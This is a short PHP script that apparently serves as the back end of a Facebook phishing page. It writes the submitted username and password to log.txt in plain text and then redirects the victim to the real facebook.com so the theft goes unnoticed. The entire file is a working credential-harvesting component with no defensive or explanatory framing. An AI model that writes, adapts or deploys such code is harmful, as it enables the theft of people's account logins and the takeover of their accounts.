<?php

$cadena = $_POST['user'] . ":" . $_POST['pass'] . PHP_EOL;
$arch = fopen("log.txt", "a+");  
fwrite($arch, $cadena);
fclose($arch);
header('location: https://www.facebook.com');